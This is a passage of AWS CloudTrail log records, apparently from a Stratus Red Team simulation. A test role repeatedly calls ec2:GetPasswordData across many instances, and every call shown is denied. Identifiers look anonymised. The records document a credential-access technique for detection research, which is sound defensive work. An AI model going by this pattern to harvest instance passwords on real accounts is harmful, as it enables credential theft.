{\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: vI3cDVgKJvmlMzN8rT24DeQOh9di8wn6vWRhl7MKZYEHwshGC7bY0RXqvxRIFTQNaddFRU7snsmuRbDWCJhQ5b_E7tu5T614NYSVWVA-voW06n-BOfulZtczb3PyUhqbGpg9vjiiY-OrpAWZ6F025pam2NYdRGvNYxLxrRIJcc-Pgy6AOKrgqoBuIYS9KWg1xhnVaU_MwL79F31AiLn_2xPKnBmuxw0Gbf66kSPQi4HBkBT7hpsCLz9iyrVLOOGUV8yKQM95ZzvoGL0hxfMCiLL1PxQAkAECTuhYIMseN7dDrkwqyy5CUjQmKCmKxJvwskEp5WZogiQjtkk44pe-ODMesOjJx5jGfWhpbpXS505jUD5noJpQtzF3HTuCecAdsUezzqJMy7xfgKfZwM_0S5vxuP71ZdLGUIyI8dXT8yyGvVdennbqgGnmSlgR5236yhxAsYtX7mRP5-pNjVGsPvz0YOA0MYzyQHTAmHFqsMK3efkeySF4DqsrvFp8E-_4zQuOy8xcsl2Lt0EXibfAqUOwRxh1n0TZ5hJ3_KgirWcFGhfAEDlgK_btXALP9uWvgAA\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"560bcc37-36b9-43f4-8447-2bab2d7cd7cf\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"b25e0f2a-0a98-4b8f-8893-fce249e28a83\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-aq9pmsueolxr81r5\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: MvyJ8E7JRlJ8qrNOLCxvOgNHlEoVtWB6q7tZDACABTX_jUO8rHfwdhptvxZXjjrECMntJyC781EvTNGomFMVEsi7X7m3WYsdVSCTV3_b6vvnO73HHYOPDJA67Uu860JC_nvDqubgE8tVYaEQfIv2tkoLOa_giq3CnHTnT8OTem2osy1fvZ9ZoqtOm8L_yt0o_Xa4gm1q4uhq_9OjanBPHK1Vi1EKlOSAu6MMD6_QHoby_vZMs8zBqXHZMMZKh7ENCR-RVW-nutH3WyZ9kUyKK9ZoLCD4RKh7OR9xuvs6b5p-SvvIhC9W4SYFhSUcbqXr32IDoY0T6IaaYY_I-ZBxJJv8sDWP4FFx-Zgnj6jkJwbpJL3zrDF5t1uYx_-d7dl7fXztnlaSFchdmdBtu2gWlakT8vwWFKIAWFlP9EzDVsooEN8jBT9CT7XasorGDrjMkoXUL74wSQ8bsbZuXazBBT3xK2cfXoCZQ_YYW1ITOif_RAHKzn78evQrg917qNktjM09reyr9xYP34rMbKlabtbZwx0KKP8xtSU_teXhTMRQ5UydA9NQMCCGvrjd2-TWdaM\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"76a3f52e-5c4c-4a62-818d-a2bc8bddc2e6\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"f48594da-0a0d-4e9c-a641-0f9dd4fec8fc\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-x7jwh6qy39glvq1r\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: ex0NeuPRe8xwBXWSB-bMPAP_IMRYGNBpDD0SaeD3RV2Y-0w39P_2oAFjmi-r8BNT69RYOJ-hza1FZen-cwGssTUW5prEYz1Nf1c1nmupsXlbIS9oGexXcLlk0eftjhtp1oW5mxnhE0QYe_1VvGLde6mv5FsTKvO8_kcW0HuKi47kTgBB1RlLnjXrBQ9D6bUqmpyJzPv-9R651JtTJ0dggDS7lEN0vagJI1y7MdhgUnr63ZFDwwNN9tHzZS_jzC232IH5Nh-4AFSvPYYcHP75ahrQBARAriMWycPyvQZypwEwR5IeM9pDwnVPbhQZnk07KV67c-B5Y_VIv0rmaSpCsf0HEwW5kCP1QV6CZIpnCTku1Ghwt-nCouj_Yv62oJg3j8xTBMgivye_UC_mv2zDF9vCcsWQ7F2-uit-rbKyzIKC72UBP5DAchNYeHhBShD9heqssLqgNrpO_1nTzA_bUdxWiVCI20QRazEobNiVm9vbdDB_LD9mLpvfQsT8k8qWT1_E7yaR9_1ZVcW13BZ2zDD66YBIIiKD3bVixCibVF1VuktZcM0DMHYquWHyJyqN_o5L\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0c7f6148-c337-4e49-8df5-cb333c6fb7d6\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"4fa792f1-a997-4739-a79c-215983a2cce7\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-vgu76uxucxlpp04e\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: sy7SXIS8cR0ggyin7T9E00rq0UiBYf3eugsTZ-Ogk79Vr7gPWzUxv5S1-6UGbgDluSzgK5qh5bj2VmJiWaAwIlMfWlkTKGSQkcf5gz5wOK7xVi-QjG_ZZMg6JlpeQlf42ElPwTHSlsjHU7OIRcFmIpSy15svaRMouoxwxKfdDF7FtruzOBMlbwFSS9EjcO9BS_SHVSsJte6TxSYwyrR4tNVke6T_P4rBeL7ztd7h_W5CInqYvgQV8ivmmB3ZCKHmui3eS5NaWAlVPYiPUIv5h2VUjqzEt3HsSHpjdQQuXOoSy3lQuqGNgSBwMuemwkT1hcpmSyUWkdKbIuVMHGKvPx5fh5SBkcIUEn4Zijtlo6qWX9q_A739rbuQs9Tek1i1N5xO5f0ab_sepQdNEQZexx8lT8H8lOwjPZNrcUuppHp2o3sbVJgMn-75snd68YVWP3u0-QuNiQ-TyBYuu-RCVOct_7dOhDEwIixzMKgX-xbSm0AMICAT5saVXRwwrL1PB63t2nq52lWHstgzS5hapqr8GBhT6VHgjiPgadckQde1p8cN476Y_3nt4vbjTlixyHQ\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4bf1ca5d-42ba-4e95-a493-9cdeefb58b87\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"8efcec3b-8c76-4b8b-acc4-884b7040aa69\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-ozzfav7qglzosg49\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: w4BeNvjyqgZy54yIPW-Fi1znuurlnMJBtXRoh5NdfY7bT8fFvjHYaLQ6EUXTTjnEMB4Gv5bwqpgFzM5lzvWFweErUq6l2N5nvU_e2hVJgAhQyDII36qsr2Jj_XeFX6UoQb3pimMn6T4q4oDxP7FtsIt8uIrAVxc5ECs_3JbDgshdjVHf0yz0VgZprSF-2bbppKqgD_B1BkIEe587cUlDyrH6XszhIww2-k6Jj82FrDBowlBEJwREI9VnJdFWFO5y1NInklHF_bBFkyat2Nr5aXpwDUMEPY6dY5Ggv2I2ggujHKbtkXRF4AbxCN1SfyX3jLS98ewC3mZaVymcADN1KRghMytqsxMfjAeOOi0OzUrLZl5YcWCN9cH1Sca2KU5ZISpwGQSETyCD--KM5_J8mHQS_ijmTXUXxCpdjgUZRo3dn4Krll1H18IlRMtovF5KqR4HpPL4bVX1l6LL8e2gs3x_NtQys8aWA1aybnT6dWP12eb7P_j6YKziDMfp6zx1smQjHlPwxRg3I7w84EcpCXdNIpqVSxOo-PrmpH5u_0rfkHXEzjfYX5vbJ-dt8BeDOfA\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7466f497-7987-44d9-aeb1-5034d02c9f87\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"9da09dec-5398-47cf-a763-ebab997f543f\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-t3wz01wvchd1i3ji\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: D8EVYsR5r16Iqx5IHuCEN7fghFzk7W_8XbwrZzPIH0vwpygIn9k9LSeOsmINlF6dZU9r9rWXxbpxmmnwr39FJS7UAyqkNvN-nMQc-ySOHrTZobFllAx1vwRNnYVUwu_AMKV6ov2s-969CBXV4OImXntzJmBLx_lsvb27jey_rQLzS-1H8hpXoQl2lKsBr4NZNk7xUEpPs_5a6V-ZkPBA_UoTXn6xIBmjC5y_gNwvWeP-OpTa6hmG-XKsPGrr5zP-b07P0gkc6k9ykR7e2MTQ40zqwfSwmXAkLjL8mR5HeGoP9DSkgcfYhlb4sK7-97tSBlMcZhYd9KEMRkQqK_N1BHS6lMGO0eikQKAyjVaQvld_05HXsIE5R0813DC8PhFZK1GxFMh96h_nY8c3Bl_IXs1DraSgo2EPF5sx7HnY6alpk_3_1frHmTIaVSuHdDKPkQ2_5pkkdCV_nQgjU9tKhFYIfL1fETZL21uNtlKLSE1UBQlbw6b5LSpy5tROI5Kfq-0Da6ynh_Aqvmbdxi-oCVaf2T1SW_G6DFjUWU0xDXSa2PbKTwIxFUJlVebyoF2zE1M\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8d006dac-fa19-4599-a336-d3a230b535f6\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"1cfed956-fcee-4f9c-bb7d-b1d512e97044\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-ny0ek1fbv2k4irgb\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: TVZFjm-mt3TE7psRWv4wzimRYmROaE6RK6a-blk1M1QXc5J1ZqaOWP4_UilTumdJ8Uni_NqKwfRUhKpwB4zcMHYAZmYsDx9D0jaMwKBsbWQPmSLn7nh3MVpsN-pmsT4cp2LC3lUc_ql7wqWDeipnbHH2UCZxBhlun8Otv4vpF5YrkraD-M9_AROMNwYMfMbe4mfamHx7kk1Qa2rjEqGuyALHTp726hJAMv00n3Wng4K1eUJLgGITGVh592lKycF8NUD5Sty5-ELzaql25MKFIcYypw91I3rI1_uhf7KGbtGPl5mXu_ukfa7gAUZjaFmJT0AfpCjVgjsji5oM0QWqqqJvbBdTwz48kAc86JSKl-A2w--D0xaEhqRe23mGGvdPemXB4PHggmhaueeVEPL5bV74aDc9fHQhGG2NiCOa3QZPR3QPg69ddwFVyThf3tjLIoZ_e4T7OWlGBZjU8BkQ5rPdwPbrvwpsNJjcUzP7OLaxnviUFUhRSBwhZqiI035mI1kqtE0vxzbXNwS9j5RIfjv92BrvSFwNMZb8agK1Q3siL3wadOqNGYOkgyLkVk40kRdy\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b1f34826-4e8b-4527-b17a-ef9cb24ac379\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"195c9d73-fd82-4ec4-a72c-2ead0602b322\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-p9e9ocan02xrzude\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: 4DDnYxe39i3VZP2qCvPfBcHUBBBMcdYYSyzhljgHjyGL6996txALAExpdhvWyVLfDOat8FRPllNzoixRpTCZWRlo35Dg_FnqfL1IF29WP49Wy1973IXWcqE4uXpt_F3IF8GsCnoKQns0KAyo9fLObSFnt67AwSxAgzsi6McdREq8cIg0mdIjCK2nhBc6v1VKCHuLau_QUzLh5qI5BgRDHK6FSggymuCyI3uUsNnwRfR6VT4RCN5EoT5-_aedTBlLwe81MCo3azLKWwsv6JtQpL5jfxoy-4Txygq7KNPMLxX7_HHkLPYhWy5x4CKZK-ZXqu9biSwcUJrkNIpCqUmgLV1rDtKoaePONy5Xo-TunhCkN8s796aU3ij815Hsv0OVXk62NWdg_pcnnIfon-YWM5empS0xLUqyBeHEawYAKPO3grDGlMxVfovIV-uFpmR9KdOsW3D5HAkq4FNi_2DGF6IYSY-VRxYxv40P9TBovXH7BTAniJNA1A6ilwzseqiBdtKmHc_2EoOkBTrQtIufDmd9PyE0aP2vCfVOz0pemh2ZPshJjf_8l5tHYwGBlJgpumo\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"eec493d8-1181-4ed7-9d29-1de1e87ee98b\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"c029fc7d-b85b-42ff-8351-31aaf6c1225e\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-yjhbbydwe3p29swd\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: 